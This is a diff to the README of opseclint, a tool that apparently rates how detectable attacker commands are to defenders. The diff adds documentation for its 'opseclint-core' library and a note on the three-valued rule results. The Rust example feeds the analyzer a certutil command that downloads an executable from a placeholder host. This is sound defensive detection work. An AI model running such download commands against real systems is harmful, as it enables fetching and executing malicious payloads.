@@ -64,6 +64,7 @@
         <li><a href="#use-as-a-github-action">Use as a GitHub Action</a></li>
         <li><a href="#detectability-score">Detectability score</a></li>
         <li><a href="#how-it-works">How it works</a></li>
+        <li><a href="#use-it-as-a-library">Use it as a library</a></li>
       </ul>
     </li>
     <li><a href="#whats-shipped">What's shipped</a></li>
@@ -452,9 +453,29 @@ exceeds an agreed noise budget.
    deduplicates per line, and ranks findings loudest-first.
 4. **Report** (`report.rs`): terminal, JSON, or SARIF output, plus the CI gate.
 
-All KBs are embedded at compile time, so opseclint ships as a single static
-binary with no runtime dependencies. Adding coverage is a data change, not a code
-change. See [CONTRIBUTING.md](CONTRIBUTING.md).
+Steps 1–3 live in [`opseclint-core`](crates/opseclint-core); step 4 is this
+binary. All KBs are embedded at compile time, so opseclint ships as a single
+static binary with no runtime dependencies. Adding coverage is a data change,
+not a code change. See [CONTRIBUTING.md](CONTRIBUTING.md).
+
+### Use it as a library
+
+The knowledge base, the `match` engine, and the Sigma evaluator are published
+as [`opseclint-core`](https://crates.io/crates/opseclint-core) — the same code
+this binary runs, for tools that need to answer "what would a defender see?"
+somewhere other than a terminal.
+
+```rust
+use opseclint_core::{analyzer, kb, Platform};
+
+let kb = kb::load(Platform::WindowsSysmon)?;
+let report = analyzer::analyze("certutil -urlcache -f http://x/a.exe a.exe", &kb);
+```
+
+One caveat carries over, and it matters more in a library than in a report a
+human reads: rule evaluation is three-valued. `INDETERMINATE` means the input
+could not answer the question — treat it as its own verdict, never as "not
+detected". Full docs at [docs.rs/opseclint-core](https://docs.rs/opseclint-core).
 
 Try it against the [`examples/`](examples/) playbooks:
 
@@ -476,6 +497,7 @@ opseclint examples/macos-postex.sh    --platform macos-es        # keychain, Gat
 - Real SigmaHQ enrichment with an on-disk cache
 - SARIF output → GitHub code scanning
 - Distribution: crates.io, prebuilt binaries, a GitHub Action, and a GHCR image
+- [`opseclint-core`](crates/opseclint-core): the knowledge base, `match` engine, and Sigma evaluator as a library, with this binary as its first consumer
 - [Sigma rule-logic evaluator](docs/design/rule-logic-evaluator.md): three-valued `FIRES` / `NO-FIRE` / `INDETERMINATE`, via `--check-rule`
 - `--coverage-gaps`: flag actions whose techniques have rules but where none fire
 - macOS/Endpoint Security KB at breadth parity with Linux/Windows (66 entries)
